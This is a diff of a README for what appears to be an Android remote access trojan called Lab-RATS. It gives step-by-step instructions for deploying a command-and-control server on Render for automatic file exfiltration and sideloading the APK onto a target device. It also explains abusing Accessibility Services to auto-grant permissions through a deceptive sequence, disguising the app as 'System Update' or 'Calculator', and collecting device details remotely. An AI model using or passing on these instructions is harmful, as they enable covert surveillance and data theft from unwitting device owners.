@@ -241,10 +241,9 @@ data.stealth === "true") ? "ACTIVE" : "OFF",
 
 ### ✌🏻 NEW! Option 2: Tactical Node.js Backend *(Upgraded)*
 **Best for professional fleet management** and **Automatic File Exfiltration**.
-**Quick Deployment on** <a href="https://render.com" target="_blank">Render.com</a>.
 
 **1. Fork the Lab-RATS-v1.6 repository**.
-<br>**2. Create a new Web Service on Render** and **connect your Lab-RATS repo**.
+<br>**2. Create a new Web Service on <a href="https://render.com" target="_blank">Render.com</a>** and **connect your Lab-RATS repo**.
 <br>**3. Set the Root Directory** to /c2-server.
 <br>**4. Set the Build Command** to `npm install`.
 <br>**5. Set the Start Command** to `npm start`.
@@ -337,7 +336,7 @@ emulators**.
 #### C. Installation & Initialization:
 Once the **Target device** downloads the **APK**:
 1.  **Manual Sideload**: If you have **physical access to the device**, use `adb install signed.apk`
-2.  **NEW! 'One-Click' Permissions (CRITICAL)**: **Open the app ONCE**. **Now only the Initial Pop-up *(Accessibility Services)* must be Manually toggled on**, **ALL other permissions are Auto-Granted by the system** with a **convincing security sequence**.
+2.  **NEW! 'One-Click' Permission Granting (CRITICAL)**: **Open the app ONCE**. **Only the Initial Pop-up *(Accessibility Services)* must be manually toggled on**, **ALL other permissions are now auto-granted by the system** using a **convincing security sequence**.
    -  **Remote Permission Prompt**: If the **user skips some permissions**, you can **remotely trigger the system prompt again** from the **Ghost Tab** using the **REPAIR PERMISSIONS** button.
 3.  **Self-Vanishing**: A **few seconds after launch**, the app will **automatically replace its icon and name** with the **decoy you chose during build** *("System Update", "Calculator"...etc)*.
 4.  **Uplink Confirmation**: Check your **Google Sheet or Render C2. Within 5 seconds of initialization**, the **Device ID, Connection Type, IP Address & Port, C2 Dashboard Link, Battery %, Stealth & Charging Status and Device Storage will appear in the log**.
